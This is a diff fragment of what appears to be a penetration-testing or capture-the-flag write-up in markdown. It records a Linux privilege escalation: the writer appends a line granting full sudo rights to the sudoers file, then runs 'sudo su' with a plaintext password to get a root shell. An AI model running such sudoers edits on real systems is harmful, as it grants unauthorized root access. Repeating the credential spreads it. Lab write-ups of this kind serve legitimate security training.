@@ -217,6 +217,16 @@ Enumerated top 200 UDP ports:
 
 #### -Typed  "dir" and found we were in the machines "/etc" directory:
 
+![](Pasted%20image%2020221026154240.png)
+
+#### -Typed "echo commander ALL=(ALL) ALL >> sudoers"
+
+![](Pasted%20image%2020221026154413.png)
+#SudoersLinuxPrivilegeEscalation
+
+#### -Typed "sudo su" and commanders password CommanderKeenVorticons1990 and received a root shell:
+
+
 
 
 ---
